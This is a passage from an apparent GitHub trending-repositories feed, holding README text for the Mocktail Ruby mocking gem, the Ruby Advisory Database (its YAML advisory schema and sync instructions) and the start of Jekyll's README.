# =&amp;gt; nil!&#xA;&#xA;payload = payload_captor.value # {:imagine=&amp;gt;&#34;that&#34;, :this=&amp;gt;&#34;is&#34;, :a=&amp;gt;&#34;huge&#34;, :object=&amp;gt;&#34;!&#34;}&#xA;assert_equal &#34;huge&#34;, payload[:a]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Mocktail.replace&lt;/h3&gt; &#xA;&lt;p&gt;Mocktail was written to support isolated test-driven development, which usually results in a lot of boring classes and instance methods. But sometimes you need to mock singleton methods on classes or modules, and we support that too.&lt;/p&gt; &#xA;&lt;p&gt;When you call &lt;code&gt;Mocktail.replace(type)&lt;/code&gt;, all of the singleton methods on the provided type are replaced with fake methods available for stubbing and verification. It&#39;s really that simple.&lt;/p&gt; &#xA;&lt;p&gt;For example, if our &lt;code&gt;Bartender&lt;/code&gt; class has a class method:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class Bartender&#xA;  def self.cliche_greeting&#xA;    [&#34;It&#39;s 5 o&#39;clock somewhere!&#34;, &#34;Norm!&#34;].sample&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can replace the behavior of the overall class, and then stub how we&#39;d like it to respond, in our test:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;Mocktail.replace(Bartender)&#xA;stubs { Bartender.cliche_greeting }.with { &#34;Norm!&#34; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;[&lt;strong&gt;Obligatory warning:&lt;/strong&gt; Mocktail does its best to ensure that other threads won&#39;t be affected when you replace the singleton methods on a type, but your mileage may very! Singleton methods are global and code that introspects or invokes a replaced method in a peculiar-enough way could lead to hard-to-track down bugs. (If this concerns you, then the fact that class methods are effectively global state may be a great reason not to rely too heavily on them!)]&lt;/p&gt; &#xA;&lt;h3&gt;Mocktail.explain&lt;/h3&gt; &#xA;&lt;p&gt;Test debugging is hard enough when there &lt;em&gt;aren&#39;t&lt;/em&gt; fake objects flying every which way, so Mocktail tries to make it a little easier on you. In addition to returning useful messages throughout the API, the gem also includes an introspection method &lt;code&gt;Mocktail.explain(thing)&lt;/code&gt;, which returns a human-readable &lt;code&gt;message&lt;/code&gt; and a &lt;code&gt;reference&lt;/code&gt; object with useful attributes (that vary depending on the type of fake &lt;code&gt;thing&lt;/code&gt; you pass in. Below are some things &lt;code&gt;explain()&lt;/code&gt; can do.&lt;/p&gt; &#xA;&lt;h4&gt;Fake instances created by Mocktail&lt;/h4&gt; &#xA;&lt;p&gt;Any instances created by &lt;code&gt;Mocktail.of&lt;/code&gt; or &lt;code&gt;Mocktail.of_next&lt;/code&gt; can be passed to &lt;code&gt;Mocktail.explain&lt;/code&gt;, and they will list out all the calls and stubbings made for each of their fake methods.&lt;/p&gt; &#xA;&lt;p&gt;Suppose these interactions have occurred:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;ice_tray = Mocktail.of(IceTray)&#xA;&#xA;Mocktail.stubs { ice_tray.fill(:tap_water, 30) }.with { :some_ice }&#xA;&#xA;ice_tray.fill(:tap_water, 50)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can interrogate what&#39;s going on with the fake instance by passing it to &lt;code&gt;explain&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;explanation = Mocktail.explain(ice_tray)&#xA;&#xA;explanation.reference.type      #=&amp;gt; IceTray&#xA;explanation.reference.double    #=&amp;gt; The ice_tray instance&#xA;explanation.reference.calls     #=&amp;gt; details on each invocation of each method&#xA;explanation.reference.stubbings #=&amp;gt; all stubbings configured for each method&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Calling &lt;code&gt;explanation.message&lt;/code&gt; will return:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;This is a fake `IceTray&#39; instance.&#xA;&#xA;It has these mocked methods:&#xA;  - fill&#xA;&#xA;`IceTray#fill&#39; stubbings:&#xA;&#xA;  fill(:tap_water, 30)&#xA;&#xA;`IceTray#fill&#39; calls:&#xA;&#xA;  fill(:tap_water, 50)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Modules and classes with singleton methods replaced&lt;/h4&gt; &#xA;&lt;p&gt;If you&#39;ve called &lt;code&gt;Mocktail.replace()&lt;/code&gt; on a class or module, it can also be passed to &lt;code&gt;Mocktail.explain()&lt;/code&gt; for a summary of all the stubbing configurations and calls made against its faked singleton methods for the currently running thread.&lt;/p&gt; &#xA;&lt;p&gt;Imagine a &lt;code&gt;Shop&lt;/code&gt; class with &lt;code&gt;self.open!&lt;/code&gt; and &lt;code&gt;self.close!&lt;/code&gt; singleton methods:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;Mocktail.replace(Shop)&#xA;&#xA;stubs { |m| Shop.open!(m.numeric) }.with { :a_bar }&#xA;&#xA;Shop.open!(42)&#xA;&#xA;Shop.close!(42)&#xA;&#xA;explanation = Mocktail.explain(Shop)&#xA;&#xA;explanation.reference.type      #=&amp;gt; Shop&#xA;explanation.reference.replaced_method_names #=&amp;gt; [:close!, :open!]&#xA;explanation.reference.calls     #=&amp;gt; details on each invocation of each method&#xA;explanation.reference.stubbings #=&amp;gt; all stubbings configured for each method&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And &lt;code&gt;explanation.message&lt;/code&gt; will return:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;`Shop&#39; is a class that has had its singleton methods faked.&#xA;&#xA;It has these mocked methods:&#xA;  - close!&#xA;  - open!&#xA;&#xA;`Shop.close!&#39; has no stubbings.&#xA;&#xA;`Shop.close!&#39; calls:&#xA;&#xA;  close!(42)&#xA;&#xA;  close!(42)&#xA;&#xA;`Shop.open!&#39; stubbings:&#xA;&#xA;  open!(numeric)&#xA;&#xA;  open!(numeric)&#xA;&#xA;`Shop.open!&#39; calls:&#xA;&#xA;  open!(42)&#xA;&#xA;  open!(42)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Methods on faked instances and replaced types&lt;/h4&gt; &#xA;&lt;p&gt;In addition to passing the test double, you can also pass a reference to any fake method created by Mocktail to &lt;code&gt;Mocktail.explain&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;ice_tray = Mocktail.of(IceTray)&#xA;&#xA;ice_tray.fill(:chilled, 50)&#xA;&#xA;explanation = Mocktail.explain(ice_tray.method(:fill))&#xA;&#xA;explanation.reference.receiver  #=&amp;gt; a reference to the `ice_tray` instance&#xA;explanation.reference.calls     #=&amp;gt; details on each invocation of the method&#xA;explanation.reference.stubbings #=&amp;gt; all stubbings configured for the method&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The above may be handy in cases where you want to assert the number of calls of a method outside the &lt;code&gt;Mocktail.verify&lt;/code&gt; API:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;assert_equal 1, explanation.reference.calls.size&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The explanation will also contain a &lt;code&gt;message&lt;/code&gt; like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;`IceTray#fill&#39; has no stubbings.&#xA;&#xA;`IceTray#fill&#39; calls:&#xA;&#xA;  fill(:chilled, 50)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Replaced singleton methods can also be passed to &lt;code&gt;explain()&lt;/code&gt;, so something like &lt;code&gt;Mocktail.explain(Shop.method(:open!))&lt;/code&gt; from the earlier example would also work (with &lt;code&gt;Shop&lt;/code&gt; being the &lt;code&gt;receiver&lt;/code&gt; on the explanation&#39;s &lt;code&gt;reference&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;h4&gt;Undefined methods&lt;/h4&gt; &#xA;&lt;p&gt;There&#39;s no API for this one, but Mocktail also offers explanations for methods that don&#39;t exist yet. You&#39;ll see this error message whenever you try to call a method that doesn&#39;t exist on a test double. The message is designed to facilitate &#34;paint-by-numbers&#34; TDD, by including a sample definition of the method you had attempted to call that can be copy-pasted into a source listing:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class IceTray&#xA;end&#xA;&#xA;ice_tray = Mocktail.of(IceTray)&#xA;&#xA;ice_tray.fill(:water_type, 30)&#xA;# =&amp;gt; No method `IceTray#fill&#39; exists for call: (NoMethodError)&#xA;#&#xA;#      fill(:water_type, 30)&#xA;#&#xA;#    Need to define the method? Here&#39;s a sample definition:&#xA;#&#xA;#      def fill(water_type, arg)&#xA;#      end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;From there, you can just copy-paste the provided method stub as a starting point for your new method:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;class IceTray&#xA;  def fill(water_type, amount)&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Mocktail.explain_nils&lt;/h3&gt; &#xA;&lt;p&gt;Is a faked method returning &lt;code&gt;nil&lt;/code&gt; and you don&#39;t understand why?&lt;/p&gt; &#xA;&lt;p&gt;By default, methods faked by Mocktail will return &lt;code&gt;nil&lt;/code&gt; when no stubbing is satisfied. A frequent frustration, therefore, is when the way &lt;code&gt;stubs {}.with {}&lt;/code&gt; is configured does not satisfy a call the way you expected. To try to make debugging this a little bit easier, the gem provides a top-level &lt;code&gt;Mocktail.explain_nils&lt;/code&gt; method that will return an array of summaries of every call to a faked method that failed to satisfy any stubbings.&lt;/p&gt; &#xA;&lt;p&gt;For example, suppose you stub this &lt;code&gt;fill&lt;/code&gt; method like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;ice_tray = Mocktail.of(IceTray)&#xA;&#xA;stubs { ice_tray.fill(:tap_water, 30) }.with { :normal_ice }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;But then you find that your subject under test is just getting &lt;code&gt;nil&lt;/code&gt; back and you don&#39;t understand why:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def prep&#xA;  ice = ice_tray.fill(:tap_water, 50)&#xA;  glass.add(ice) # =&amp;gt; why is `ice` nil?!&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Whenever you&#39;re confused by a nil, you can call &lt;code&gt;Mocktail.explain_nils&lt;/code&gt; for an array containing &lt;code&gt;UnsatisfyingCallExplanation&lt;/code&gt; objects (one for each call to a faked method that did not satisfy any configured stubbings).&lt;/p&gt; &#xA;&lt;p&gt;The returned explanation objects will include both a &lt;code&gt;reference&lt;/code&gt; object to explore as well a summary &lt;code&gt;message&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;def prep&#xA;  ice = ice_tray.fill(:tap_water, 50)&#xA;  puts Mocktail.explain_nils.first.message&#xA;  glass.add(ice)&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Which will print:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;This `nil&#39; was returned by a mocked `IceTray#fill&#39; method&#xA;because none of its configured stubbings were satisfied.&#xA;&#xA;The actual call:&#xA;&#xA;  fill(:tap_water, 50)&#xA;&#xA;The call site:&#xA;&#xA;  /path/to/your/code.rb:42:in `prep&#39;&#xA;&#xA;Stubbings configured prior to this call but not satisfied by it:&#xA;&#xA;  fill(:tap_water, 30)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The &lt;code&gt;reference&lt;/code&gt; object will have details of the &lt;code&gt;call&lt;/code&gt; itself, an array of &lt;code&gt;other_stubbings&lt;/code&gt; defined on the faked method, and a &lt;code&gt;backtrace&lt;/code&gt; to determine which call site produced the unexpected &lt;code&gt;nil&lt;/code&gt; value.&lt;/p&gt; &#xA;&lt;h3&gt;Mocktail.reset&lt;/h3&gt; &#xA;&lt;p&gt;This one&#39;s simple: you probably want to call &lt;code&gt;Mocktail.reset&lt;/code&gt; after each test, but you &lt;em&gt;definitely&lt;/em&gt; want to call it if you&#39;re using &lt;code&gt;Mocktail.replace&lt;/code&gt; or &lt;code&gt;Mocktail.of_next&lt;/code&gt; anywhere, since those will affect state that is shared across tests.&lt;/p&gt; &#xA;&lt;p&gt;Calling reset in a &lt;code&gt;teardown&lt;/code&gt; or &lt;code&gt;after(:each)&lt;/code&gt; hook will also improve the usefulness of messages returned by &lt;code&gt;Mocktail.explain&lt;/code&gt; and &lt;code&gt;Mocktail.explain_nils&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;p&gt;Mocktail is designed following a somewhat academic understanding of what mocking is and how it should be used. Below are several references on this topic.&lt;/p&gt; &#xA;&lt;p&gt;Blog Posts and Papers:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;[Endo-Testing: Unit Testing with Mock Objects](&lt;a href=&#34;https://www2.ccs.neu.edu/research/demeter/related-work/extreme-programming/MockObjectsFinal.PDF&#34;&gt;https://www2.ccs.neu.edu/research/demeter/related-work/extreme-programming/MockObjectsFinal.PDF&lt;/a&gt; by Tim Mackinnon, Steve Freeman, and Philip Craig, the paper that introduced mocking presented by the creators of mocking.&lt;/li&gt; &#xA; &lt;li&gt;Michael Feathers&#39; &lt;a href=&#34;https://michaelfeathers.typepad.com/michael_feathers_blog/2008/06/the-flawed-theo.html&#34;&gt;The Flawed Theory Behind Unit Testing&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Books:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bookshop.org/books/growing-object-oriented-software-guided-by-tests/9780321503626&#34;&gt;&lt;em&gt;Growing Object-Oriented Software, Guided by Tests&lt;/em&gt;&lt;/a&gt; by Steve Freeman and Nat Price&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Talks:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=Af4M8GMoxi4&#34;&gt;Please don’t mock me&lt;/a&gt; by Justin Searls&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;Mocktail is created &amp;amp; maintained by the software agency &lt;a href=&#34;https://twitter.com&#34;&gt;Test Double&lt;/a&gt;. If you&#39;ve ever come across our eponymously-named &lt;a href=&#34;https://github.com/testdouble/testdouble.js/&#34;&gt;testdouble.js&lt;/a&gt;, you might find Mocktail&#39;s API to be quite similar. The term &#34;test double&#34; was originally coined by Gerard Meszaros in his book &lt;a href=&#34;http://xunitpatterns.com/Test%20Double.html&#34;&gt;xUnit Test Patterns&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The name is inspired by the innovative Java mocking library &lt;a href=&#34;https://site.mockito.org&#34;&gt;Mockito&lt;/a&gt;. Mocktail also the spiritual successor to &lt;a href=&#34;https://github.com/searls/gimme&#34;&gt;gimme&lt;/a&gt;, which offers a similar API but which fell victim to the limitations of Ruby 1.8.7 (and &lt;a href=&#34;https://twitter.com/searls&#34;&gt;@searls&lt;/a&gt;&#39;s Ruby chops). Gimme was also one of the final projects we collaborated with &lt;a href=&#34;https://github.com/jimweirich&#34;&gt;Jim Weirich&lt;/a&gt; on, so this approach to isolated unit testing holds a special significance to us.&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project follows Test Double&#39;s &lt;a href=&#34;https://testdouble.com/code-of-conduct&#34;&gt;code of conduct&lt;/a&gt; for all community interactions, including (but not limited to) one-on-one communications, public posts/comments, code reviews, pull requests, and GitHub issues. If violations occur, Test Double will take any action they deem appropriate for the infraction, up to and including blocking a user from the organization&#39;s repositories.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>rubysec/ruby-advisory-db</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/rubysec/ruby-advisory-db</id>
    <link href="https://github.com/rubysec/ruby-advisory-db" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A database of vulnerable Ruby Gems&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Ruby Advisory Database&lt;/h1&gt; &#xA;&lt;p&gt;The Ruby Advisory Database is a community effort to compile all security advisories that are relevant to Ruby libraries.&lt;/p&gt; &#xA;&lt;p&gt;You can check your own Gemfile.locks against this database by using &lt;a href=&#34;https://github.com/rubysec/bundler-audit&#34;&gt;bundler-audit&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support Ruby security!&lt;/h2&gt; &#xA;&lt;p&gt;Do you know about a vulnerability that isn&#39;t listed in this database? Open an issue or submit a PR.&lt;/p&gt; &#xA;&lt;h2&gt;Directory Structure&lt;/h2&gt; &#xA;&lt;p&gt;The database is a list of directories that match the names of Ruby libraries on &lt;a href=&#34;https://rubygems.org/&#34;&gt;rubygems.org&lt;/a&gt;. Within each directory are one or more advisory files for the Ruby library. These advisory files are named using the advisories&#39; &lt;a href=&#34;https://cve.mitre.org/&#34;&gt;CVE&lt;/a&gt; identifier number.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;gems/:&#xA;  actionpack/:&#xA;    CVE-2014-0130.yml  CVE-2014-7818.yml  CVE-2014-7829.yml  CVE-2015-7576.yml&#xA;    CVE-2015-7581.yml  CVE-2016-0751.yml  CVE-2016-0752.yml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Format&lt;/h2&gt; &#xA;&lt;p&gt;Each advisory file contains the advisory information in &lt;a href=&#34;http://www.yaml.org/&#34;&gt;YAML&lt;/a&gt; format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;---&#xA;gem: examplegem&#xA;cve: 2013-0156&#xA;date: 2013-05-01&#xA;url: https://github.com/rubysec/ruby-advisory-db/issues/123456&#xA;title: |&#xA;  Ruby on Rails params_parser.rb Action Pack Type Casting Parameter Parsing&#xA;  Remote Code Execution&#xA;&#xA;description: |&#xA;  Ruby on Rails contains a flaw in params_parser.rb of the Action Pack.&#xA;  The issue is triggered when a type casting error occurs during the parsing&#xA;  of parameters. This may allow a remote attacker to potentially execute&#xA;  arbitrary code.&#xA;&#xA;cvss_v2: 10.0&#xA;cvss_v3: 9.8&#xA;&#xA;patched_versions:&#xA;  - ~&amp;gt; 2.3.15&#xA;  - ~&amp;gt; 3.0.19&#xA;  - ~&amp;gt; 3.1.10&#xA;  - &#34;&amp;gt;= 3.2.11&#34;&#xA;unaffected_versions:&#xA;  - ~&amp;gt; 2.4.3&#xA;&#xA;related:&#xA;  cve:&#xA;    - 2013-1234567&#xA;    - 2013-1234568&#xA;  url:&#xA;    - https://github.com/rubysec/ruby-advisory-db/issues/123457&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Schema&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;gem&lt;/code&gt; [String] (required): Name of the affected gem.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;library&lt;/code&gt; [String] (optional): Name of the ruby library which the affected gem belongs to.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;framework&lt;/code&gt; [String] (optional): Name of the framework which the affected gem belongs to.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;platform&lt;/code&gt; [String] (optional): If this vulnerability is platform-specific, name of platform this vulnerability affects (e.g. jruby)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cve&lt;/code&gt; [String] (optional): Common Vulnerabilities and Exposures (CVE) ID.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;osvdb&lt;/code&gt; [Integer] (optional): Open Sourced Vulnerability Database (OSVDB) ID.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;ghsa&lt;/code&gt; [String] (optional): GitHub Security Advisory (GHSA) ID.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;url&lt;/code&gt; [String] (required): The URL to the full advisory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;title&lt;/code&gt; [String] (required): The title of the advisory or individual vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;date&lt;/code&gt; [Date] (required): The public disclosure date of the advisory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;description&lt;/code&gt; [String] (required): One or more paragraphs describing the vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cvss_v2&lt;/code&gt; [Float] (optional): The &lt;a href=&#34;https://www.first.org/cvss/v2/guide&#34;&gt;CVSSv2&lt;/a&gt; score for the vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;cvss_v3&lt;/code&gt; [Float] (optional): The &lt;a href=&#34;https://www.first.org/cvss/user-guide&#34;&gt;CVSSv3&lt;/a&gt; score for the vulnerability.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;unaffected_versions&lt;/code&gt; [Array&amp;lt;String&amp;gt;] (optional): The version requirements for the unaffected versions of the Ruby library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;patched_versions&lt;/code&gt; [Array&amp;lt;String&amp;gt;] (optional): The version requirements for the patched versions of the Ruby library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;related&lt;/code&gt; [Hash&amp;lt;Array&amp;lt;String&amp;gt;&amp;gt;] (optional): Sometimes an advisory references many urls and other identifiers. Supported keys: &lt;code&gt;cve&lt;/code&gt;, &lt;code&gt;ghsa&lt;/code&gt;, &lt;code&gt;osvdb&lt;/code&gt;, and &lt;code&gt;url&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;notes&lt;/code&gt; [String] (optional): Internal notes regarding the vulnerability&#39;s inclusion in this database.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Tests&lt;/h3&gt; &#xA;&lt;p&gt;Prior to submitting a pull request, run the tests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle install&#xA;bundle exec rspec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;GitHub Advisory Sync&lt;/h3&gt; &#xA;&lt;p&gt;There is a script that will create initial yaml files for RubyGem advisories which are in the &lt;a href=&#34;https://developer.github.com/v4/object/securityadvisory/&#34;&gt;GitHub Security Advisory API&lt;/a&gt;, but are not already in this dataset. This script can be periodically run to ensure this repo has all the data that is present in the GitHub Advisory data.&lt;/p&gt; &#xA;&lt;p&gt;The GitHub Advisory API requires a token to access it.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It can be a completely scopeless token (recommended); it does not require any permissions at all.&lt;/li&gt; &#xA; &lt;li&gt;Get yours at &lt;a href=&#34;https://github.com/settings/tokens&#34;&gt;https://github.com/settings/tokens&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;To run the GitHub Advisory sync, start by executing the rake task:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;GH_API_TOKEN=&amp;lt;your GitHub API Token&amp;gt; bundle exec rake sync_github_advisories&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The rake task will write yaml files for any missing advisories.&lt;/li&gt; &#xA; &lt;li&gt;Those files must be further edited. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Fill in &lt;code&gt;cvss_v3&lt;/code&gt; field by following the CVE link and getting it from page&lt;/li&gt; &#xA;   &lt;li&gt;Fill in &lt;code&gt;patched_versions&lt;/code&gt; field, using the comments at the bottom of the file&lt;/li&gt; &#xA;   &lt;li&gt;Fill in &lt;code&gt;unaffected_versions&lt;/code&gt;, optional, if there are unaffected_versions&lt;/li&gt; &#xA;   &lt;li&gt;delete the GitHub data at the bottom of the yaml file&lt;/li&gt; &#xA;   &lt;li&gt;double check all the data, commit it, and make a PR &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;em&gt;The GitHub Advisory data is structured opposite of RubySec unfortunately: GitHub identifies version range which are vulnerable; RubySec identifies version ranges which are not vulnerable. This is why some manual work to translate is needed.&lt;/em&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Credits&lt;/h2&gt; &#xA;&lt;p&gt;Please see &lt;a href=&#34;https://github.com/rubysec/ruby-advisory-db/raw/master/CONTRIBUTORS.md&#34;&gt;CONTRIBUTORS.md&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;This database also includes data from the &lt;a href=&#34;http://www.osvdb.org/&#34;&gt;Open Sourced Vulnerability Database&lt;/a&gt; developed by the Open Security Foundation (OSF) and its contributors.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>jekyll/jekyll</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/jekyll/jekyll</id>
    <link href="https://github.com/jekyll/jekyll" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🌐 Jekyll is a blog-aware static site generator in Ruby&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;&lt;a href=&#34;https://jekyllrb.com/&#34;&gt;Jekyll&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://rubygems.org/gems/jekyll&#34;&gt;&lt;img src=&#34;https://img.shields.io/gem/v/jekyll.svg?sanitize=true&#34; alt=&#34;Gem Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/jekyll/jekyll/actions?query=workflow%3A%22Continuous+Integration%22+branch%3Amaster&#34;&gt;&lt;img src=&#34;https://github.com/jekyll/jekyll/workflows/Continuous%20Integration/badge.svg?sanitize=true&#34; alt=&#34;Linux Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ci.appveyor.com/project/jekyll/jekyll/branch/master&#34;&gt;&lt;img src=&#34;https://img.shields.io/appveyor/ci/jekyll/jekyll/master.svg?label=Windows%20build&#34; alt=&#34;Windows Build status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/jekyll/jekyll/master/#backers&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/backers/badge.svg?sanitize=true&#34; alt=&#34;Backers on Open Collective&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/jekyll/jekyll/master/#sponsors&#34;&gt;&lt;img src=&#34;https://opencollective.com/jekyll/sponsors/badge.svg?sanitize=true&#34; alt=&#34;Sponsors on Open Collective&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Jekyll is a simple, blog-aware, static site generator perfect for personal, project, or organization sites. Think of it like a file-based CMS, without all the complexity. Jekyll takes your content, renders Markdown and Liquid templates, and spits out a complete, static website ready to be served by Apache, Nginx or another web server. Jekyll is the engine behind &lt;a href=&#34;https://pages.github.com&#34;&gt;GitHub Pages&lt;/a&gt;, which you can use to host sites right from your GitHub repositories.&lt;/p&gt; &#xA;&lt;h2&gt;Philosophy&lt;/h2&gt; &#xA;&lt;p&gt;Jekyll does what you tell it to do&amp;nbsp;— no more, no less. It doesn&#39;t try to outsmart users by making bold assumptions, nor does it burden them with needless complexity and configuration. Put simply, Jekyll gets out of your way and allows you to concentrate on what truly matters: your content.&lt;/p&gt; &#xA;&lt;p&gt;See: &lt;a href=&#34;https://jekyllrb.com/philosophy&#34;&gt;https://jekyllrb.com/philosophy&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://jekyllrb.com/docs/installation/&#34;&gt;Install&lt;/a&gt; the gem&lt;/li&gt; &#xA; &lt;li&gt;Read up about its &lt;a href=&#34;https://jekyllrb.com/docs/usage/&#34;&gt;Usage&lt;/a&gt; and &lt;a href=&#34;https://jekyllrb.com/docs/configuration/&#34;&gt;Configuration&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Take a gander at some existing &lt;a href=&#34;https://github.com/jekyll/jekyll/wiki/sites&#34;&gt;Sites&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jekyll/jekyll/fork&#34;&gt;Fork&lt;/a&gt; and &lt;a href=&#34;https://jekyllrb.com/docs/contributing/&#34;&gt;Contribute&lt;/a&gt; your own modifications&lt;/li&gt; &#xA; &lt;li&gt;Have questions? Check out our official forum community &lt;a href=&#34;https://talk.jekyllrb.com/&#34;&gt;Jekyll Talk&lt;/a&gt; and &lt;a href=&#34;https://libera.chat&#34;&gt;&lt;code&gt;#jekyll&lt;/code&gt; Channel on Libera IRC&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Diving In&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://import.jekyllrb.com/docs/home/&#34;&gt;Migrate&lt;/a&gt; from your previous system&lt;/li&gt; &#xA; &lt;li&gt;Learn 